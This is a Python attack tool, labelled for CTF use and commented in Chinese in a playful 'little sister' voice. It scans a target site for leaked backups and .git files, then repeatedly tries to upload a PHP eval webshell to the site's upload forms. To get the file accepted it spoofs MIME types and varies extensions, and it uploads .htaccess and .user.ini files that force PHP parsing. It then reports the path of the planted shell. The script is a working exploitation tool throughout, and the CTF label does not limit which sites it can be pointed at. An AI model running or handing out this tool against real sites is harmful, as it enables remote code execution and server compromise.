#!/usr/bin/env python3
"""
CTF Web Source Scanner & Upload Fuzzer (Authorized Targets Only)
作者: 欧尼酱的专属代码小助手
目标:
1) 探测常见的源码泄露与备份文件 (包含 index.php 特殊路由处理)。
2) 自动寻找网页中的上传接口。
3) 如果未找到源码，对上传接口进行全面的 Fuzzing (MIME绕过、后缀绕过、内容绕过等)。
"""

import argparse
import requests
import urllib.parse
from bs4 import BeautifulSoup
import time
import re

# 禁用安全警告
requests.packages.urllib3.disable_warnings()

class CTFUploadFuzzer:
    def __init__(self, url, cookie=None):
        self.base_url = url if url.endswith('/') else url + '/'
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })
        if cookie:
            self.session.headers.update({"Cookie": cookie})
        
        self.upload_endpoints = set()
        self.source_found = False

    def scan_source_leaks(self):
        print(f"\n[+] 妹妹正在帮你扫描源码泄露点喵...")
        
        # 常见备份文件字典
        backup_files = [
            "www.zip", "www.tar.gz", "www.rar",
            "source.zip", "html.zip", "backup.zip",
            ".git/HEAD", ".svn/entries", ".DS_Store",
            "index.php.bak", "index.php~", "index.php.swp"
        ]
        
        # 结合之前 April 6 的发现：有些路由需要包含 index.php 才能成功访问下载
        routing_prefixes = ["", "index.php/"]

        for prefix in routing_prefixes:
            for file in backup_files:
                target_url = urllib.parse.urljoin(self.base_url, prefix + file)
                try:
                    resp = self.session.get(target_url, timeout=5, verify=False, allow_redirects=False)
                    # 检查是否成功下载到内容 (状态码 200 且不是返回 HTML 页面)
                    if resp.status_code == 200 and "text/html" not in resp.headers.get("Content-Type", ""):
                        print(f"  [!!!] 欧尼酱，找到疑似源码泄露啦！: {target_url}")
                        self.source_found = True
                    elif resp.status_code == 200 and ".git" in file and "ref:" in resp.text:
                        print(f"  [!!!] 发现 Git 源码泄露: {target_url}")
                        self.source_found = True
                except requests.RequestException:
                    pass

        if not self.source_found:
            print("[-] 没有找到明显的源码泄露，准备进入文件上传 Fuzzing 环节！")

    def find_upload_forms(self):
        print(f"\n[+] 正在主页寻找上传接口...")
        try:
            resp = self.session.get(self.base_url, timeout=5, verify=False)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # 寻找所有的 form 表单
            for form in soup.find_all('form'):
                # 检查表单里是否有 file 类型的 input
                if form.find('input', type='file'):
                    action = form.get('action') or ''
                    target_url = urllib.parse.urljoin(self.base_url, action)
                    self.upload_endpoints.add(target_url)
                    
            # 盲猜一些常见的上传 API
            common_apis = ["upload.php", "api/upload", "upload/"]
            for api in common_apis:
                self.upload_endpoints.add(urllib.parse.urljoin(self.base_url, api))
                
        except Exception as e:
            print(f"[-] 爬取页面报错啦: {e}")

        print(f"[*] 找到疑似上传接口: {len(self.upload_endpoints)} 个")
        return list(self.upload_endpoints)

    def fuzz_upload(self, endpoint):
        print(f"\n[+] 开始对 {endpoint} 进行 Fuzzing 轰炸 (๑•̀ㅂ•́)و✧")
        
        # 基础的一句话木马，使用短标签绕过对 <?php 的检测
        php_payload = b"GIF89a\n<?=eval($_POST['cmd']);?>"
        
        # Fuzz 字典构建 (文件名, Content-Type, 文件内容, 描述)
        fuzz_cases = [
            ("test.png", "image/png", b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDRtest_image", "正常图片测试 (探路)"),
            ("shell.php", "application/x-php", php_payload, "纯 PHP 上传"),
            ("shell.php", "image/jpeg", php_payload, "MIME 欺骗 (改Type为图片)"),
            ("shell.php3", "image/jpeg", php_payload, "后缀绕过 (.php3)"),
            ("shell.php5", "image/jpeg", php_payload, "后缀绕过 (.php5)"),
            ("shell.phtml", "image/jpeg", php_payload, "后缀绕过 (.phtml)"),
            ("shell.PhP", "image/jpeg", php_payload, "大小写绕过 (.PhP)"),
            ("shell.php.jpg", "image/jpeg", php_payload, "双后缀/解析漏洞 (shell.php.jpg)"),
            (".htaccess", "image/jpeg", b"SetHandler application/x-httpd-php", "上传 .htaccess (改变解析规则)"),
            (".user.ini", "image/jpeg", b"auto_prepend_file=shell.jpg", "上传 .user.ini (包含后面的马)"),
        ]

        success_keywords = ["success", "上传成功", "uploaded", "ok", "路径"]
        
        for filename, mime_type, content, desc in fuzz_cases:
            # 构造 multipart/form-data
            # 假设表单字段名大概率是 file, upload, image 等，这里我们用最常见的 file
            files = {
                'file': (filename, content, mime_type),
                'submit': (None, 'upload') # 有些表单需要 submit 字段
            }
            
            try:
                print(f"  -> 测试姿势: {desc} | 文件名: {filename}")
                resp = self.session.post(endpoint, files=files, timeout=5, verify=False)
                
                resp_text = resp.text.lower()
                is_success = False
                
                # 判断是否上传成功
                if resp.status_code in [200, 201]:
                    for kw in success_keywords:
                        if kw in resp_text:
                            is_success = True
                            break
                            
                if is_success:
                    print(f"     [★] 欧尼酱！这个姿势好像成功了！状态码: {resp.status_code}")
                    # 尝试从回显中提取上传后的路径
                    match = re.search(r'(/upload(?:s)?/[a-zA-Z0-9_\-\.]+)', resp.text)
                    if match:
                        print(f"     [!] 提取到可能的木马路径: {urllib.parse.urljoin(self.base_url, match.group(1).lstrip('/'))}")
                else:
                    print(f"     [-] 失败了喵... (可能被拦截)")
                    
            except requests.RequestException as e:
                print(f"     [-] 请求异常: {e}")
            
            time.sleep(0.5) # 温柔一点，别把题目环境打崩了

    def run(self):
        print(f"[*] 目标锁定: {self.base_url}")
        
        # 第一步：扫源码
        self.scan_source_leaks()
        
        # 第二步：如果没找到源码，找上传接口并 Fuzz
        if not self.source_found:
            endpoints = self.find_upload_forms()
            if not endpoints:
                print("[-] 页面上没找到明显的表单，强制测试默认路由 /upload.php")
                endpoints = [urllib.parse.urljoin(self.base_url, "upload.php")]
                
            for ep in endpoints:
                self.fuzz_upload(ep)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CTF 文件上传 & 源码泄露一体化大杀器 (By 妹妹)")
    parser.add_argument("-u", "--url", required=True, help="目标网页URL, 例如 http://127.0.0.1:8080/")
    parser.add_argument("-c", "--cookie", default="", help="登录后的 Cookie (如果需要权限)")
    
    args = parser.parse_args()
    
    fuzzer = CTFUploadFuzzer(args.url, args.cookie)
    fuzzer.run()


    # 基础扫描
    #python ctf_upload_fuzzer.py -u "http://target-ctf-site.com/"

    # 如果题目需要先登录，带上 Cookie
    #python ctf_upload_fuzzer.py -u "http://target-ctf-site.com/" -c "PHPSESSID=xxxxxx"